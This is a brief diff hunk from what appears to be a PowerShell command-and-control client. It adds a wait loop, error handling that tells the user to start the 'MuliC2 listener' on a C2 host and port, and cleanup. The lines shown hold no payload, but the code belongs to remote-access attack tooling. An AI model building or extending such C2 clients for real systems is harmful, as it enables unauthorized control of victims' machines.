@@ -373,4 +373,15 @@ public class Win32API {
             Start-Cleanup
         }
     } -ArgumentList $global:sslStream
+
+    # Wait for the job to complete or for user to interrupt
+    while ($global:inputJob.State -eq "Running" -and $global:isRunning) {
+        Start-Sleep -Milliseconds 100
+    }
+
+} catch {
+    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
+} finally {
+    Start-Cleanup
 }
